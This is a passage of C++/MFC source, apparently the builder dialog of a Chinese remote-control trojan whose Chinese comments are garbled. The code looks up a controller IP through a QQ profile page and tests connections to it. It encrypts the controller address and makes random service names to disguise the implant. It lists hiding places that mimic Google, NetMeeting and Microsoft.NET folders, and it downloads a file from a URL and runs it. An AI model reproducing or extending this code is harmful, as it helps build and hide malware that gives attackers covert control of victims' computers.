			DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
		}
		
		dwEntrySize = 0;
		FindNextUrlCacheEntry(hEntry, NULL, &dwEntrySize);
		delete [] lpCacheEntry; 
		lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
	}
	while (FindNextUrlCacheEntry(hEntry, lpCacheEntry, &dwEntrySize));
	
	bRet = TRUE;
cleanup:
	if (lpCacheEntry)
	{
		delete [] lpCacheEntry; 
	}
	return bRet;
}

void CBuild::TestQQToIP(LPCSTR ch,UINT nPort)
{
 	char abc[MAX_PATH]={0};
	wsprintf (abc, "http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s",ch);
	
	// //��internet��ʱ�ļ�
	char szPath[MAX_PATH];
	DeleteUrlCache(File);
	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE)) //�õ���ʱĿ¼���������
	{
		EmptyDirectory(szPath);
	}
	
	char	chBuff1[300*1024] = {0};    //��ȡ��������  
	
	CString myData;
	char *ip_start = NULL;
	CInternetSession mySession(NULL,0);
	CHttpFile* ChinazHttpFile = NULL;
	ChinazHttpFile = 	(CHttpFile*)mySession.OpenURL(abc);//str��Ҫ�򿪵ĵ�ַ  
	while(ChinazHttpFile->ReadString(myData)) 		//���ж�ȡҳ������   
	{
		strcpy (chBuff1, myData.GetBuffer(0));
		if(strstr(chBuff1,"0,\"")!= 0)
		{
			char *ip_stop=strstr(chBuff1,"\",0]");//IP��β��ָ�븳ֵ
			*ip_stop='\0';//�ض�
			
			ip_start=strstr(chBuff1,"0,\"")+3;//ip�ο�ʼ����ָ�븳ֵ
			break;
		}
	}
	ChinazHttpFile->Close();
	delete ChinazHttpFile;
	mySession.Close();
	CString strResult;
	
	if (ip_start)
	{
		CString str;
		str = ip_start;
		Encrypt1(str.GetBuffer(0) ,str.GetLength()); 
		CString	strResulr = "����ʧ��";
		bool	bRet = true;
		WSADATA	wsaData0;
		WSAStartup(0x0201, &wsaData0);
		
		SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sRemote == SOCKET_ERROR)
		{ 
			MessageBox("QQ����(2)����-��ʼ��ʧ��", "��ʾ", MB_ICONSTOP);
			WSACleanup();
			return ;
		}
		// ����socketΪ������
		u_long argp	= 1;
		ioctlsocket(sRemote, FIONBIO, &argp);
		
		struct timeval tvSelect_Time_Out;
		tvSelect_Time_Out.tv_sec = 3;
		tvSelect_Time_Out.tv_usec = 0;
		
		hostent* pHostent = NULL;
		pHostent = gethostbyname(str.GetBuffer(0));
		if (pHostent == NULL)
		{
			bRet = false;
			goto fail;
		}
		
		// ����sockaddr_in�ṹ
		sockaddr_in	ClientAddr;
		memset(&ClientAddr,0,sizeof(ClientAddr)); 
		ClientAddr.sin_family	= AF_INET;
		ClientAddr.sin_port	= htons(nPort);
		
		ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
		
		connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
		
		fd_set	fdWrite;
		FD_ZERO(&fdWrite);
		FD_SET(sRemote, &fdWrite);
		
		if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
		{	
			bRet = false;
			goto fail;
		}		
fail:
		closesocket(sRemote);
		WSACleanup();
		
		strResult.Format("QQ����(2)������Ϣ��\n���� IP��%s\n���Ӷ˿ڣ�%d", str, nPort);
		if (bRet)
		{
			strResulr = "���ӳɹ�";
			MessageBox(strResult,strResulr,MB_ICONINFORMATION);
		}
		else
		{
			MessageBox(strResult,strResulr,MB_ICONSTOP);
		}
		return ;
	}
	else
	{
		strResult = "����ʧ��...(���ǲ�һ�������ϣ����ɣ���֮����С����ԣ�ȷ����QQû��)";
	}
	
	MessageBox(strResult,"��ʾ",MB_ICONSTOP);	
	return;
}

void CBuild::OnTestMaster2() 
{
	// TODO: Add your control notification handler code here
		// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_dns2.GetLength()|| !m_port2)
	{
		MessageBox("��������дQQ����(2)������Ϣ", "��ʾ", MB_ICONSTOP);
		return;
	}

	m_testBtn2.EnableWindow(FALSE);
	TestQQToIP(m_dns2.GetBuffer(0),m_port2);
	m_testBtn2.EnableWindow(TRUE);
}

void CBuild::TestMaster() 
{
	// TODO: Add your control notification handler code here
//	BuildServer	*pThis = (BuildServer *)lparam;
	CString	strResult;
	CString	strResulr = "����ʧ��";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		MessageBox("����IP����-��ʼ��ʧ��", "��ʾ", MB_ICONSTOP);
		WSACleanup();
		return ;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(m_dns1);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(m_port1);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
		goto fail;
	}
	
fail:
	closesocket(sRemote);
	WSACleanup();
	
	strResult.Format("����IP������Ϣ��\n���� IP��%s\n���Ӷ˿ڣ�%d", m_dns1, m_port1);
	if (bRet)
	{
		strResulr = "���ӳɹ�";
		MessageBox(strResult,strResulr,MB_ICONINFORMATION);
	}
    else
	{
		MessageBox(strResult,strResulr,MB_ICONSTOP);
	}
	m_testBtn.EnableWindow(true); //�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	
	return ;
}

void CBuild::TestMaster2() 
{
	// TODO: Add your control notification handler code here
//	BuildServer	*pThis = (BuildServer *)lparam;
	CString	strResult;
	CString	strResulr = "����ʧ��";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		MessageBox("QQ����(2)����-��ʼ��ʧ��", "��ʾ", MB_ICONSTOP);
		WSACleanup();
		return ;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	
	pHostent = gethostbyname(m_dns2);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(m_port2);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
		goto fail;
	}
	
fail:
	closesocket(sRemote);
	WSACleanup();
	
	strResult.Format("QQ����(2)������Ϣ��\n���� IP��%s\n���Ӷ˿ڣ�%d", m_dns2, m_port2);
	if (bRet)
		strResulr = "���ӳɹ�";
	
	MessageBox(strResult,strResulr,MB_ICONINFORMATION);
	m_testBtn2.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	
	return ;
}

void CBuild::OnIPjm() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strDnsIP = m_jmip+"  ";
	char *ps =  (LPSTR)(LPCTSTR)strDnsIP;
	
	unsigned char m_strData[256];
	strcpy((char *)m_strData,ps);
	Encrypt((char *)m_strData,strlen((const char *)m_strData));
	SetDlgItemText(IDC_LONGPASS2,(const char *)m_strData);   //�ļ���
}

void CBuild::OnSjfz() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strText1 = m_Sjfz;
	
	//�����ݱ��浽�����塣
	if (!strText1.IsEmpty())
	{
		if (OpenClipboard())
		{
			EmptyClipboard();
			HGLOBAL hClipboardData = GlobalAlloc(GHND | GMEM_SHARE, (strText1.GetLength() + 1) * sizeof(TCHAR));
			if (hClipboardData)
			{
				TCHAR* pszData = (TCHAR *)GlobalLock(hClipboardData);
				strcpy(pszData, strText1);
				GlobalUnlock(hClipboardData);
				SetClipboardData(CF_TEXT, hClipboardData);
			}
			CloseClipboard();
		}
		MessageBox("���Ƴɹ�!","��ʾ", MB_ICONINFORMATION);
	}	
}

int CBuild::ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

CString GetExePath()
{
	char pathbuf[260];
	int  pathlen = ::GetModuleFileName(NULL,pathbuf,MAX_PATH);
	// �滻������
	while(TRUE)
	{
		if(pathbuf[pathlen--]=='\\')
			break;
	}
	pathbuf[++pathlen]= 0*0;
	CString  fname = pathbuf;
	return   fname;
}

CString CBuild::GetIPAddress()     
{
	CString strIPAddr;
	int pos1, pos2;
	
	try
	{
		CInternetSession session;
		CString strURL(_T("http://www.taobao.com/help/getip.php"));
		CStdioFile* pFile = session.OpenURL(strURL);
		pFile->ReadString(strIPAddr);
		pFile->Close();
		delete pFile;
		session.Close();
	}
	catch (CException* e)
	{
		e->ReportError();
		e->Delete();
	}
	
	pos1 = strIPAddr.Find('\"') + 1;
	pos2 = strIPAddr.ReverseFind('\"');
	strIPAddr = strIPAddr.Mid(pos1, pos2 - pos1);
	return strIPAddr;
}

void CBuild::OnFtpIp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CBuild sty;
	CString Gip;
	
	m_Ftp_ip.EnableWindow(FALSE);  //���ð���
	Gip=sty.GetIPAddress();
	SetDlgItemText(IDC_LONGIP2,Gip);
	m_Ftp_ip.EnableWindow(TRUE);   //�ָ�����
}

//�������
int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL Capital, int i)
{
	DWORD iCount=GetTickCount()+i;
	
	Sleep(5);
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CBuild::OnRandom2() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[30]={NULL};
	ZeroMemory(ServerName,30);
	RandMoniCount++;

	for (int i=0;i<12;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);

	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);

	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}

	CHAR szTemp[10]={NULL};
	ZeroMemory(szTemp,10);

	for (i=0;i<5;i++)
	{
		if(i==0)
		{
			szTemp[i]=GetRandChar(TRUE,i);
			continue;
		}

		szTemp[i]=GetRandChar(FALSE,i);
	}

	CString	WJ_Name=szTemp;
	SetDlgItemText(IDC_DLL_NAME,WJ_Name+".exe");   //�ļ���

	SetDlgItemText(IDC_EDIT_SVCNAME,ServerName);
	SetDlgItemText(IDC_EDIT_SCNAME,ServerShow);
	SetDlgItemText(IDC_EDIT_SHELP,ServerDesc);
}

void CBuild::OnBtnPath() 
{
	MessageBox("�ļ���װ����·�����б��е�·��Ϊ��\n1. %SystemRoot%\\system32\\,��C:\\WINDOWS\\system32\\\n2. %ProgramFiles%\\StormII\\,��C:\\Program Files\\StormII\\\n3. %ALLUSERSPROFILE%\\Application Data\\Storm\\update\\,��C:\\Documents and Settings\\All Users\\Application Data\\Storm\\update\\\n4. %ProgramFiles%\\Google\\,��C:\\Program Files\\Google\\\n5. %ProgramFiles%\\NetMeeting\\,��C:\\Program Files\\NetMeeting\\\n6. %ALLUSERSPROFILE%\\Application Data\\DRM\\,��C:\\Documents and Settings\\All Users\\Application Data\\DRM\\\n7. %ProgramFiles%\\AppPatch\\,��C:\\Program Files\\AppPatch\\\n8. %ALLUSERSPROFILE%\\Application Data\\Microsoft.NET\\,��C:\\Documents and Settings\\All Users\\Application Data\\Microsoft.NET\\\n���Լ������Զ���·�����������а��������������100�ֽڣ�\n�趨��·�������ڻ᳢�Դ���������ʧ�ܲ�������!\n9.�ļ�����֧��jpg,png,pif,msc,bat,gif,exe��!","��װ·��",MB_ICONINFORMATION);		
}

HBRUSH CBuild::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	int nCtrlID = pWnd->GetDlgCtrlID();
	if (nCtrlID==IDC_EDIT_BUILDLOG && nCtlColor == CTLCOLOR_EDIT)
	{
		COLORREF clr = RGB(200, 200, 200);
		pDC->SetTextColor(clr);   //���û�ɫ���ı�
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		hbr = CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else if ((nCtrlID==IDC_DNS || nCtrlID==IDC_PORT) && m_lanpenetrate)
	{
		COLORREF clr = RGB(255, 0, 0);
		pDC->SetTextColor(clr);   //���ú�ɫ���ı�
	}
	return hbr;
}

void CBuild::OnKbCheck()
{
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
}

bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	memset(lpSubKey, 0, sizeof(lpSubKey));
	sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	if (!CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
		return false;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if (GetFileAttributes(lpszPath)==0xFFFFFFFF && GetLastError()==ERROR_FILE_NOT_FOUND)
		return FALSE;
	else
		return TRUE;
}

void CBuild::OnKbTest() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	char *lpUrl = NULL;
	char *lpFileName = NULL;
	char szFilePath[MAX_PATH] = {0};
	
	if (m_edit_kb.GetLength() == 0)
	{
		AfxMessageBox("�ļ���ַΪ�գ��������ļ������ַ");
		return ;
	}
	
	lpUrl = m_edit_kb.GetBuffer(0);
	lpFileName = strrchr(lpUrl, '/');
	if (lpFileName == NULL)
	{
		AfxMessageBox("�޷���ȡ�ļ������ַ�е��ļ���");
		return;
	}
	
	GetTempPath(sizeof(szFilePath), szFilePath);
	strcat(szFilePath, ++lpFileName);
	
	HRESULT hr = URLDownloadToFile(NULL, lpUrl, szFilePath, 0, NULL);
	if (hr == S_OK)
	{
		if (!CheckFileExist(szFilePath))
		{
			AfxMessageBox("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ�����ļ�������");
			return ; 
		}
	}
	else if (hr == INET_E_DOWNLOAD_FAILURE) 
	{
		AfxMessageBox("URL��ַ����ȷ���ļ�����ʧ��");
		return ; //URL��ַ����ȷ���ļ�����ʧ��
	}
	else
	{
		AfxMessageBox("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ");
		return ; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	}
	OpenFile1(szFilePath, SW_SHOW);
	//ShellExecute(NULL, "open", szFilePath, NULL, NULL, SW_SHOW);
}

BOOL CBuild::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message==WM_RBUTTONDOWN && pMsg->hwnd==GetDlgItem(IDC_TEST_MASTER)->m_hWnd)
	{
		m_lanpenetrate = !m_lanpenetrate;
		GetDlgItem(IDC_DNS)->Invalidate(FALSE);
		GetDlgItem(IDC_PORT)->Invalidate(FALSE);
// 		if (m_lanpenetrate)
// 			MessageBox("������������͸ģʽ!", "��ʾ", MB_ICONINFORMATION);
// 		else
// 			MessageBox("�ѽ���������͸ģʽ!", "��ʾ", MB_ICONINFORMATION);
	}
	return CDialog::PreTranslateMessage(pMsg);
}



